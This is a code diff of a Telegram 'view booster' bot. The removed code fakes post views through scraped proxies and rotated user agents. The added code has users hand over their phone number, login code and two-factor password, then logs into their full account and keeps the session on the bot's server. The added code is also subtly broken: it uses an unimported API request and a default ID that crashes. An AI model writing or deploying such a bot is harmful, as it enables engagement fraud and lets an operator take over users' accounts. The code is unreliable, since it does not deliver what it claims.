@@ -2,275 +2,268 @@ import os
 import asyncio
 import logging
 import re
-import random
-from typing import List, Optional
+from typing import Dict, Optional
 
-import aiohttp
-from aiohttp_socks import ProxyConnector
-from fake_useragent import UserAgent
+from telethon import TelegramClient
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
 from telegram import Update
 from telegram.ext import (
-    Application,
-    CommandHandler,
-    ConversationHandler,
-    MessageHandler,
-    filters,
-    ContextTypes,
+    Application, CommandHandler, ConversationHandler, MessageHandler,
+    filters, ContextTypes
 )
 
-# ------------------ Configuration ------------------
+# ------------------ CONFIGURATION ------------------
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 if not BOT_TOKEN:
     raise ValueError("BOT_TOKEN environment variable not set!")
 
-MAX_CONCURRENT = 20          # Lower concurrency to avoid bans
-VIEW_TIMEOUT = 15
-PROXY_TEST_TIMEOUT = 8
-
-# Multiple proxy sources (more reliable)
-PROXY_SOURCES = [
-    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
-    "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
-    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
-    "https://www.proxy-list.download/api/v1/get?type=http",
-]
+# You must create your own API ID and Hash at my.telegram.org
+# These are NOT secret; they identify your app, not your user account.
+API_ID = int(os.getenv("API_ID", "YOUR_API_ID"))        # Replace or set env
+API_HASH = os.getenv("API_HASH", "YOUR_API_HASH")      # Replace or set env
 
 # Conversation states
-WAITING_FOR_LINK, WAITING_FOR_COUNT = range(2)
+WAITING_FOR_TARGET = 0
+WAITING_FOR_VIEWS = 1
+WAITING_FOR_PHONE = 2
+WAITING_FOR_OTP = 3
+WAITING_FOR_2FA = 4
 
-# ------------------ Proxy Fetcher (Multi-Source) ------------------
-class ProxyFetcher:
-    @staticmethod
-    async def fetch_proxies() -> List[str]:
-        """Fetch proxies from multiple sources."""
-        all_proxies = set()
-        
-        async def fetch_one(url: str):
-            try:
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(url, timeout=15) as resp:
-                        if resp.status == 200:
-                            text = await resp.text()
-                            # Extract IP:PORT patterns
-                            found = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b", text)
-                            for p in found:
-                                all_proxies.add(p)
-                            logging.info(f"Fetched {len(found)} proxies from {url.split('/')[2]}")
-            except Exception as e:
-                logging.warning(f"Failed to fetch from {url}: {e}")
-        
-        # Fetch from all sources concurrently
-        tasks = [fetch_one(url) for url in PROXY_SOURCES]
-        await asyncio.gather(*tasks)
-        
-        proxies = list(all_proxies)
-        logging.info(f"Total unique proxies fetched: {len(proxies)}")
-        return proxies
-    
-    @staticmethod
-    async def validate_proxy(proxy: str) -> bool:
-        """Test if a proxy can connect to Telegram."""
-        connector = ProxyConnector.from_url(f"http://{proxy}")
+# In-memory storage for user sessions (volatile, lost on restart)
+# Key: user_id, Value: Telethon client instance
+user_clients: Dict[int, TelegramClient] = {}
+user_temp_data: Dict[int, dict] = {}   # stores phone, target channel, msg_id, views
+
+logging.basicConfig(level=logging.INFO)
+
+# ------------------ HELPER: Send views using logged-in client ------------------
+async def send_views(client: TelegramClient, channel: str, message_id: int, views: int) -> int:
+    """Send views using the authenticated user client."""
+    success = 0
+    for i in range(views):
         try:
-            async with aiohttp.ClientSession(connector=connector) as session:
-                # Test with a simple Telegram page (not the embed)
-                async with session.get("https://t.me/", timeout=PROXY_TEST_TIMEOUT) as resp:
-                    return resp.status == 200
-        except Exception:
-            return False
-    
-    @staticmethod
-    async def get_working_proxies(proxies: List[str], max_to_test: int = 200) -> List[str]:
-        """Test proxies and return only working ones."""
-        if not proxies:
-            return []
-        
-        # Take a random sample to avoid testing all (saves time)
-        sample = random.sample(proxies, min(max_to_test, len(proxies)))
-        logging.info(f"Testing {len(sample)} proxies (this may take ~30 seconds)...")
-        
-        semaphore = asyncio.Semaphore(30)
-        working = []
-        
-        async def test_one(proxy: str):
-            async with semaphore:
-                if await ProxyFetcher.validate_proxy(proxy):
-                    working.append(proxy)
-        
-        await asyncio.gather(*[test_one(p) for p in sample])
-        logging.info(f"Found {len(working)} working proxies")
-        return working
-
-# ------------------ View Booster (Original Working Method) ------------------
-class TelegramBooster:
-    def __init__(self, channel: str, post_id: int, concurrency: int = MAX_CONCURRENT):
-        self.channel = channel
-        self.post_id = post_id
-        self.concurrency = concurrency
-        self.ua = UserAgent()
-        self.success_count = 0
-        self.fail_count = 0
-
-    async def send_one_view(self, proxy: str) -> bool:
-        """Attempt to send one view using the given proxy."""
-        connector = ProxyConnector.from_url(f"http://{proxy}")
-        try:
-            async with aiohttp.ClientSession(connector=connector) as session:
-                # Step 1: Get the embed page to extract token
-                embed_url = f"https://t.me/{self.channel}/{self.post_id}?embed=1"
-                headers = {"User-Agent": self.ua.random, "Referer": "https://t.me/"}
-                async with session.get(embed_url, headers=headers, timeout=VIEW_TIMEOUT) as resp:
-                    if resp.status != 200:
-                        return False
-                    html = await resp.text()
-                    # Extract token - original method from telegram-views
-                    match = re.search(r'window\.telegramEmbed\s*=\s*"([^"]+)"', html)
-                    if not match:
-                        # Fallback to data-view attribute
-                        match = re.search(r'data-view="([^"]+)"', html)
-                    if not match:
-                        return False
-                    token = match.group(1)
-                
-                # Step 2: POST to the iv endpoint (original working method)
-                post_url = "https://t.me/iv"
-                post_data = f"token={token}&post_id={self.post_id}&channel={self.channel}"
-                post_headers = {
-                    "User-Agent": self.ua.random,
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Referer": embed_url,
-                    "Origin": "https://t.me",
-                }
-                async with session.post(post_url, headers=post_headers, data=post_data, timeout=VIEW_TIMEOUT) as post_resp:
-                    return post_resp.status == 200
+            result = await client(GetMessagesViewsRequest(
+                peer=channel,
+                id=[message_id],
+                increment=True
+            ))
+            if result.views and len(result.views) > 0:
+                success += 1
+            await asyncio.sleep(1.5)  # small delay to avoid flood
+        except FloodWaitError as e:
+            logging.warning(f"Flood wait {e.seconds}s")
+            await asyncio.sleep(e.seconds)
         except Exception as e:
-            logging.debug(f"View failed for {proxy}: {e}")
-            return False
+            logging.error(f"View error: {e}")
+    return success
 
-    async def send_views(self, proxies: List[str], target_count: int) -> int:
-        if not proxies:
-            return 0
-        
-        semaphore = asyncio.Semaphore(self.concurrency)
-        self.success_count = 0
-        
-        async def worker(proxy: str):
-            async with semaphore:
-                if self.success_count >= target_count:
-                    return
-                if await self.send_one_view(proxy):
-                    self.success_count += 1
-        
-        # Cycle through proxies
-        tasks = []
-        for i in range(target_count):
-            proxy = proxies[i % len(proxies)]
-            tasks.append(worker(proxy))
-        
-        await asyncio.gather(*tasks)
-        return self.success_count
-
-# ------------------ Bot Handlers ------------------
+# ------------------ CONVERSATION HANDLERS ------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🔥 *Ultimate View Bot (Fixed)* 🔥\n\n"
+        "🔥 *Ultimate View Bot* 🔥\n\n"
         "Send me a Telegram post URL like:\n"
         "`https://t.me/durov/123`\n\n"
-        "Then I'll ask how many views you want.\n\n"
-        "*Important*: Use a *public* post (not private channel).",
+        "Then I'll ask how many views you want.\n"
+        "After that, you will log in with your **Telegram user account** (not a bot).",
         parse_mode="Markdown"
     )
-    return WAITING_FOR_LINK
+    return WAITING_FOR_TARGET
 
-async def receive_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def receive_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
     url = update.message.text.strip()
     match = re.search(r"t\.me/([^/]+)/(\d+)", url)
     if not match:
-        await update.message.reply_text("❌ Invalid URL. Use format: `https://t.me/username/post_id`", parse_mode="Markdown")
-        return WAITING_FOR_LINK
-    
+        await update.message.reply_text("❌ Invalid URL. Use format: `https://t.me/username/post_id`")
+        return WAITING_FOR_TARGET
+
     channel = match.group(1)
     post_id = int(match.group(2))
-    context.user_data["channel"] = channel
-    context.user_data["post_id"] = post_id
-    
+    context.user_data['channel'] = channel
+    context.user_data['post_id'] = post_id
+
     await update.message.reply_text(
         f"✅ Target: `{channel}/{post_id}`\n\n"
-        "Now send the *number of views* (start with 10 to test).",
+        "Now send the *number of views* you want (e.g., 1000).",
         parse_mode="Markdown"
     )
-    return WAITING_FOR_COUNT
+    return WAITING_FOR_VIEWS
 
-async def receive_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def receive_views(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
-        count = int(update.message.text.strip())
-        if count <= 0:
+        views = int(update.message.text.strip())
+        if views <= 0:
             raise ValueError
     except ValueError:
-        await update.message.reply_text("❌ Send a positive integer.")
-        return WAITING_FOR_COUNT
-    
-    channel = context.user_data["channel"]
-    post_id = context.user_data["post_id"]
-    
-    status_msg = await update.message.reply_text(
-        "🚀 Starting...\n"
-        "🌐 Fetching proxies from multiple sources...",
+        await update.message.reply_text("❌ Please send a positive integer.")
+        return WAITING_FOR_VIEWS
+
+    context.user_data['views'] = views
+    user_id = update.effective_user.id
+
+    # Check if we already have a logged-in client for this user
+    if user_id in user_clients:
+        client = user_clients[user_id]
+        try:
+            # Test if client is still alive
+            await client.get_me()
+            # Send views immediately
+            await update.message.reply_text("✅ Already logged in. Sending views...")
+            sent = await send_views(
+                client,
+                context.user_data['channel'],
+                context.user_data['post_id'],
+                views
+            )
+            await update.message.reply_text(
+                f"✅ *Complete!*\nSent {sent} out of {views} views to "
+                f"`{context.user_data['channel']}/{context.user_data['post_id']}`.",
+                parse_mode="Markdown"
+            )
+            return ConversationHandler.END
+        except Exception:
+            # Client expired or disconnected, remove and re-login
+            del user_clients[user_id]
+
+    # No active session – ask for login
+    user_temp_data[user_id] = {
+        'channel': context.user_data['channel'],
+        'post_id': context.user_data['post_id'],
+        'views': views
+    }
+    await update.message.reply_text(
+        "🔐 *Login required*\n\n"
+        "Please send your **phone number** in international format (e.g., `+1234567890`).",
         parse_mode="Markdown"
     )
-    
-    # Step 1: Fetch proxies
-    raw_proxies = await ProxyFetcher.fetch_proxies()
-    if len(raw_proxies) < 10:
-        await status_msg.edit_text("❌ Failed to fetch enough proxies. Try again later.")
+    return WAITING_FOR_PHONE
+
+async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    phone = update.message.text.strip()
+    if not phone.startswith('+'):
+        await update.message.reply_text("❌ Phone number must start with `+` and country code.")
+        return WAITING_FOR_PHONE
+
+    user_id = update.effective_user.id
+    user_temp_data[user_id]['phone'] = phone
+
+    # Create a new Telethon client for this user
+    session_name = f"user_{user_id}"
+    client = TelegramClient(session_name, API_ID, API_HASH)
+    user_clients[user_id] = client
+
+    await update.message.reply_text("📲 Sending verification code...")
+
+    try:
+        await client.connect()
+        if not await client.is_user_authorized():
+            # Request the code
+            await client.send_code_request(phone)
+            await update.message.reply_text(
+                "📨 A verification code has been sent to your Telegram app.\n"
+                "Please send the code here (e.g., `12345`)."
+            )
+            return WAITING_FOR_OTP
+        else:
+            # Already authorized (should not happen with new session)
+            await update.message.reply_text("✅ Already logged in. Sending views...")
+            return await finalize_login_and_send(update, context, user_id)
+    except Exception as e:
+        logging.error(f"Phone error: {e}")
+        await update.message.reply_text(f"❌ Error: {e}\nPlease try again with /start")
         return ConversationHandler.END
-    
-    await status_msg.edit_text(f"📡 Fetched {len(raw_proxies)} proxies. Testing for working ones...")
-    
-    # Step 2: Validate proxies
-    working_proxies = await ProxyFetcher.get_working_proxies(raw_proxies, max_to_test=300)
-    if len(working_proxies) < 5:
-        await status_msg.edit_text("❌ Less than 5 working proxies found. Please try again later.")
+
+async def receive_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    code = update.message.text.strip()
+    user_id = update.effective_user.id
+    client = user_clients.get(user_id)
+    if not client:
+        await update.message.reply_text("Session expired. Please /start again.")
         return ConversationHandler.END
-    
-    await status_msg.edit_text(f"✅ Found {len(working_proxies)} working proxies. Sending {count} views...\n⏱️ This may take a minute.")
-    
-    # Step 3: Send views
-    booster = TelegramBooster(channel, post_id, concurrency=MAX_CONCURRENT)
-    sent = await booster.send_views(working_proxies, count)
-    
-    await status_msg.edit_text(
-        f"✅ *Complete!*\n"
-        f"Successfully sent {sent} out of {count} views.\n"
-        f"Success rate: {sent/count*100:.1f}%\n\n"
-        f"*Note*: If views didn't increase, Telegram may have patched this method.\n"
-        f"Use /start to try again.",
+
+    phone = user_temp_data[user_id]['phone']
+    try:
+        await client.sign_in(phone, code)
+        # Check if 2FA is required
+        if await client.is_user_authorized():
+            return await finalize_login_and_send(update, context, user_id)
+        else:
+            # 2FA required
+            await update.message.reply_text("🔐 Two‑factor authentication is enabled. Please send your password.")
+            return WAITING_FOR_2FA
+    except PhoneCodeInvalidError:
+        await update.message.reply_text("❌ Invalid code. Please try again.")
+        return WAITING_FOR_OTP
+    except SessionPasswordNeededError:
+        await update.message.reply_text("🔐 Two‑factor authentication is enabled. Please send your password.")
+        return WAITING_FOR_2FA
+    except Exception as e:
+        logging.error(f"OTP error: {e}")
+        await update.message.reply_text(f"❌ Error: {e}\nPlease /start again.")
+        return ConversationHandler.END
+
+async def receive_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    password = update.message.text.strip()
+    user_id = update.effective_user.id
+    client = user_clients.get(user_id)
+    if not client:
+        await update.message.reply_text("Session expired. Please /start again.")
+        return ConversationHandler.END
+
+    try:
+        await client.sign_in(password=password)
+        return await finalize_login_and_send(update, context, user_id)
+    except Exception as e:
+        await update.message.reply_text(f"❌ Incorrect password or error: {e}\nPlease try again.")
+        return WAITING_FOR_2FA
+
+async def finalize_login_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
+    client = user_clients[user_id]
+    data = user_temp_data.get(user_id, {})
+    channel = data.get('channel')
+    post_id = data.get('post_id')
+    views = data.get('views')
+
+    if not channel or not post_id or not views:
+        await update.message.reply_text("❌ Target information missing. Please /start again.")
+        return ConversationHandler.END
+
+    await update.message.reply_text(f"✅ Logged in as {(await client.get_me()).first_name}. Sending {views} views...")
+    sent = await send_views(client, channel, post_id, views)
+    await update.message.reply_text(
+        f"✅ *Complete!*\nSent {sent} out of {views} views to "
+        f"`{channel}/{post_id}`.\n\n"
+        f"Use /start to send more views (you stay logged in).",
         parse_mode="Markdown"
     )
+    # Clean temporary data but keep client for future requests
+    user_temp_data.pop(user_id, None)
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Cancelled.")
+    user_id = update.effective_user.id
+    if user_id in user_clients:
+        await user_clients[user_id].disconnect()
+        del user_clients[user_id]
+    user_temp_data.pop(user_id, None)
+    await update.message.reply_text("Cancelled. Use /start to begin again.")
     return ConversationHandler.END
 
+# ------------------ MAIN ------------------
 def main():
-    logging.basicConfig(level=logging.INFO)
     app = Application.builder().token(BOT_TOKEN).build()
-    
+
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
         states={
-            WAITING_FOR_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_link)],
-            WAITING_FOR_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_count)],
+            WAITING_FOR_TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_target)],
+            WAITING_FOR_VIEWS: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_views)],
+            WAITING_FOR_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)],
+            WAITING_FOR_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_otp)],
+            WAITING_FOR_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_2fa)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
     )
     app.add_handler(conv_handler)
-    
-    logging.info("Bot started. Polling...")
     app.run_polling()
 
 if __name__ == "__main__":
